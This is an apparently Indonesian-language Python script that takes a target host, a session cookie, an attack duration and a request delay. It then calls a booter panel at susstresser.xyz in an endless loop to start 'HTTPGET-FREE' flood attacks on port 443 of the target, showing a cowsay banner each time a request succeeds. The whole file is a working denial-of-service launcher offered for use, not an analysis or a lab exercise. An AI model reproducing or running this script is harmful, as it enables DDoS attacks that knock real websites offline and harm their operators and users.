import requests
import time
import cowsay
from tqdm import tqdm
import sys

def slow_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def get_input(prompt):
    slow_print(prompt, 0.05)
    return input()

def animate_cowsay(message):
    for _ in tqdm(range(100), desc="Processing", ncols=75):
        time.sleep(0.01)
    cowsay.cow(message)

def main():
    # Prompt user for name, host URL, cookie, time, and delay
    name = get_input("Masukkan nama: ")
    host = get_input("Masukkan URL host: ")
    cookie = get_input("Masukkan cookie: ")
    attack_time = int(get_input("Masukkan waktu (dalam detik) untuk serangan: "))
    delayt = int(get_input("Masukkan jeda (dalam detik) antar request: "))

    # Update the headers with the user-provided cookie
    headers = {
        "alt-svc": 'h3=":443"; ma=86400',
        "cache-control": "no-store, no-cache, must-revalidate",
        "cf-cache-status": "DYNAMIC",
        "content-encoding": "zstd",
        "content-type": "text/html; charset=UTF-8",
        "expires": "Thu, 19 Nov 1981 08:52:00 GMT",
        "pragma": "no-cache",
        "priority": "u=1,i",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "cookie": cookie,
        "referer": "https://susstresser.xyz/panel/hub.php",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }

    url = f"https://susstresser.xyz/panel/complexx/hub.php?type=start&host={host}&port=443&time={attack_time}&method=HTTPGET-FREE&totalservers=1&vip=0"

    while True:
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                message = f"Copyright © mnytc\nNama: {name}\nHost: {host}\nSudah Berjalan..."
                animate_cowsay(message)
            else:
                slow_print(f"Error: {response.status_code}")
        except Exception as e:
            slow_print(f"Terjadi kesalahan: {e}")
        time.sleep(delayt)  # Delay sesuai input pengguna

if __name__ == "__main__":
    main()
